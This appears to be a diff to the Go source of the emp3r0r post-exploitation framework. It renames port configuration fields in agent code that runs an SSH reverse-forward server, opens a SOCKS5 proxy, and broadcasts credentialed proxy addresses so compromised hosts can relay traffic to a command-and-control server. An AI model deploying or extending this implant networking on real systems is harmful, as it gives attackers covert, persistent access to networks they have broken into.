@@ -39,20 +39,20 @@ func BroadcastServer(ctx context.Context, cancel context.CancelFunc, port string
 	// reverseProxy listener
 	// ssh reverse proxy
 	go func() {
-		err = tun.SSHRemoteFwdServer(RuntimeConfig.SSHProxyPort,
+		err = tun.SSHRemoteFwdServer(RuntimeConfig.ReverseProxyPort,
 			RuntimeConfig.Password,
 			RuntimeConfig.SSHHostKey)
 		if err != nil {
 			log.Printf("SSHProxyServer: %v", err)
 		}
 	}()
-	// monitor socks5://127.0.0.1:RuntimeConfig.ProxyPort until it works
+	// monitor socks5://127.0.0.1:RuntimeConfig.AutoProxyPort until it works
 	go func() {
 		// does the proxy work?
 		rproxy := fmt.Sprintf("socks5://%s:%s@127.0.0.1:%s",
-			RuntimeConfig.ShadowsocksPort,
+			RuntimeConfig.ShadowsocksLocalSocksPort,
 			RuntimeConfig.Password,
-			RuntimeConfig.AutoProxyPort)
+			RuntimeConfig.Emp3r0rProxyServerPort)
 		for !tun.IsProxyOK(rproxy, emp3r0r_data.CCAddress) {
 			time.Sleep(time.Second)
 		}
@@ -122,7 +122,7 @@ func passProxy(ctx context.Context, cancel context.CancelFunc, count *int) {
 			return
 		}
 		log.Printf("[+] BroadcastServer: %s will be served here too, let's hope it helps more agents\n", proxyAddr)
-		err := tun.TCPFwd(sl[1], RuntimeConfig.AutoProxyPort, ctx, cancel)
+		err := tun.TCPFwd(sl[1], RuntimeConfig.Emp3r0rProxyServerPort, ctx, cancel)
 		if err != nil {
 			log.Print("TCPFwd: ", err)
 		}
@@ -165,13 +165,13 @@ func StartBroadcast(start_socks5 bool, ctx context.Context, cancel context.Cance
 
 	if start_socks5 {
 		// start a socks5 proxy
-		err := Socks5Proxy("on", "0.0.0.0:"+RuntimeConfig.AutoProxyPort)
+		err := Socks5Proxy("on", "0.0.0.0:"+RuntimeConfig.Emp3r0rProxyServerPort)
 		if err != nil {
 			log.Printf("Socks5Proxy on: %v", err)
 			return
 		}
 		defer func() {
-			err := Socks5Proxy("off", "0.0.0.0:"+RuntimeConfig.AutoProxyPort)
+			err := Socks5Proxy("off", "0.0.0.0:"+RuntimeConfig.Emp3r0rProxyServerPort)
 			if err != nil {
 				log.Printf("Socks5Proxy off: %v", err)
 			}
@@ -188,9 +188,9 @@ func StartBroadcast(start_socks5 bool, ctx context.Context, cancel context.Cance
 		ips := tun.IPaddr()
 		for _, netip := range ips {
 			proxyMsg := fmt.Sprintf("socks5://%s:%s@%s:%s",
-				RuntimeConfig.ShadowsocksPort,
+				RuntimeConfig.ShadowsocksLocalSocksPort,
 				RuntimeConfig.Password,
-				netip.IP.String(), RuntimeConfig.AutoProxyPort)
+				netip.IP.String(), RuntimeConfig.Emp3r0rProxyServerPort)
 			broadcastAddr := tun.IPbroadcastAddr(netip)
 			if broadcastAddr == "" {
 				continue
